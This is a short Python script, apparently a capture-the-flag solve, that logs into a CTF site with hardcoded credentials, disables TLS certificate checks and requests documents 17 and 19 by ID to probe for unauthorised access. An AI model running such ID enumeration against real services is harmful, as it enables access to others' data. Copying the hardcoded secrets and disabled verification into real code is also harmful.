import requests

session = requests.Session()
url_login = "https://ctf.marabit.xyz/api/auth/login"
data = {"email": "analyst@blackarchive.local", "password": "ArchiveAccess2026!"}
session.post(url_login, json=data, verify=False)

url_doc = "https://ctf.marabit.xyz/api/documents/17"
r = session.get(url_doc, verify=False)
print("Doc 17:", r.status_code, r.text)

url_doc = "https://ctf.marabit.xyz/api/documents/19"
r = session.get(url_doc, verify=False)
print("Doc 19:", r.status_code, r.text)
